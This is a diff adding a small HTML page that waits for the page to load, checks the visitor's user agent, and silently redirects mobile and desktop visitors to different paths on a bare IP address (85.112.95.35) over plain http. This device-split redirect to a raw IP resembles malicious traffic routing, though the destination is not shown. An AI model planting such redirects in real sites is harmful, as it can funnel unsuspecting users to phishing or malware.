@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.onload = function() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const isMobile = /android|iphone|ipad|ipod|mobile/i.test(userAgent);
+      
+      if (isMobile) {
+        window.location.href = "http://85.112.95.35/2";
+      } else {
+        window.location.href = "http://85.112.95.35/1";
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>Detecting device... Please wait.</p>
+</body>
+</html>
